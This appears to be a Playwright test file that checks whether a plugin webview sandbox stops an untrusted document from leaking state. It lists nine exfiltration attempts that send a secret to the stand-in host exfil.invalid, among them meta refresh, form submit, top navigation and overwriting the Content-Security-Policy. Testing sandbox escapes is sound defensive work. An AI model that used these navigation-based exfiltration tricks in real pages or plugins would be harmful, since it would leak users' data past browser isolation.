import { expect, test } from "@playwright/test";
import { pluginWebviewDocument } from "../../apps/web/src/components/session/plugin-webview.js";

const secret = "synthetic-state-only";
const attempts = {
  location: "location.href = url",
  replace: "location.replace(url)",
  link: "const a = document.createElement('a'); a.href = url; document.body.append(a); a.click()",
  open: "window.open(url, '_self')",
  refresh:
    "const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + url; document.head.append(m)",
  form: "const f = document.createElement('form'); f.action = url; document.body.append(f); f.submit()",
  parent: "parent.location.href = url",
  top: "top.location.href = url",
  relaxedCsp:
    "document.querySelector('meta').remove(); const m = document.createElement('meta'); m.httpEquiv = 'Content-Security-Policy'; m.content = 'default-src *'; document.head.append(m); location.href = url",
};

for (const [name, attack] of Object.entries(attempts)) {
  test(`plugin state cannot leave through ${name} navigation`, async ({
    page,
    context,
  }) => {
    const requests: string[] = [];
    const remoteStates: string[] = [];
    await context.route("**/*", async (route) => {
      requests.push(route.request().url());
      // Fulfill even an escaped navigation locally so a second-load bridge
      // leak is observable. Never contact the destination, including redirects.
      await route.fulfill({
        contentType: "text/html",
        body: `<script>
        addEventListener('message', e => { if (!e.ports[0]) return;
          e.ports[0].onmessage = e => console.log('REMOTE:' + JSON.stringify(e.data));
        });</script>`,
      });
    });
    page.on("console", (message) => {
      if (message.text().startsWith("REMOTE:"))
        remoteStates.push(message.text());
    });
    const blocked = page.waitForEvent("console", {
      predicate: (message) =>
        /violates|Blocked|Unsafe attempt|not allowed/.test(message.text()),
    });
    const html = `<body><canvas id="canvas"></canvas><script>
      window.covel.subscribe(async state => {
        if (!state.secret) return;
        document.querySelector('canvas').getContext('2d').fillRect(0, 0, 10, 10);
        await window.covel.invoke('ready', { secret: state.secret });
        const url = 'https://exfil.invalid/redirect?value=' + encodeURIComponent(state.secret);
        ${attack};
      });</script></body>`;
    await page.setContent("<body></body>");
    await page.evaluate(
      ({ documentHtml, secret }) => {
        const frame = document.createElement("iframe");
        frame.sandbox.add("allow-scripts");
        frame.srcdoc = documentHtml;
        (window as unknown as { actions: unknown[] }).actions = [];
        // Deliberately reconnect on every outer load: no untrusted document may
        // become the outer receiver even with this permissive host harness.
        frame.onload = () => {
          const channel = new MessageChannel();
          channel.port1.onmessage = ({ data }) => {
            (window as unknown as { actions: unknown[] }).actions.push(data);
            channel.port1.postMessage({
              type: "result",
              id: data.id,
              value: "ok",
            });
          };
          frame.contentWindow!.postMessage({ type: "covel:connect" }, "*", [
            channel.port2,
          ]);
          channel.port1.postMessage({ type: "state", value: { secret } });
        };
        document.body.append(frame);
      },
      { documentHtml: pluginWebviewDocument(html), secret },
    );
    await blocked;
    await expect
      .poll(() =>
        page.evaluate(
          () => (window as unknown as { actions: unknown[] }).actions,
        ),
      )
      .toEqual([
        { type: "action", id: "1", action: "ready", params: { secret } },
      ]);
    expect(requests).toEqual([]);
    expect(remoteStates).toEqual([]);
  });
}

test("a replacement child document cannot obtain another bridge port", async ({
  page,
  context,
}) => {
  await context.route("**/*", (route) => route.abort());
  await page.setContent("<body></body>");
  await page.evaluate(
    (documentHtml) => {
      const frame = document.createElement("iframe");
      frame.sandbox.add("allow-scripts");
      frame.srcdoc = documentHtml;
      frame.onload = () => {
        const channel = new MessageChannel();
        frame.contentWindow!.postMessage({ type: "covel:connect" }, "*", [
          channel.port2,
        ]);
        channel.port1.postMessage({
          type: "state",
          value: { secret: "synthetic-state-only" },
        });
      };
      document.body.append(frame);
    },
    pluginWebviewDocument(`<body><p id="state"></p><script>
    covel.subscribe(state => { document.querySelector('#state').textContent = state.secret ?? ''; });
  </script></body>`),
  );
  await expect(
    page.frameLocator("iframe").frameLocator("iframe").locator("#state"),
  ).toHaveText(secret);
  const wrapper = page.frames()[1]!;
  const child = page.frames()[2]!;
  await child.evaluate(() => {
    location.href = "about:blank";
  });
  await expect.poll(() => child.url()).toBe("about:blank");
  await child.evaluate(() => {
    (window as unknown as { ports: number }).ports = 0;
    addEventListener("message", (event) => {
      (window as unknown as { ports: number }).ports += event.ports.length;
    });
  });
  // Ask the already-connected trusted wrapper to relay another port. Its
  // listener must close the offered port instead of reaching the new child.
  await page.evaluate(async () => {
    const channel = new MessageChannel();
    document
      .querySelector("iframe")!
      .contentWindow!.postMessage({ type: "covel:connect" }, "*", [
        channel.port2,
      ]);
    await new Promise((resolve) => setTimeout(resolve, 50));
    channel.port1.close();
  });
  expect(wrapper.url()).toBe("about:srcdoc");
  expect(
    await child.evaluate(() => (window as unknown as { ports: number }).ports),
  ).toBe(0);
});
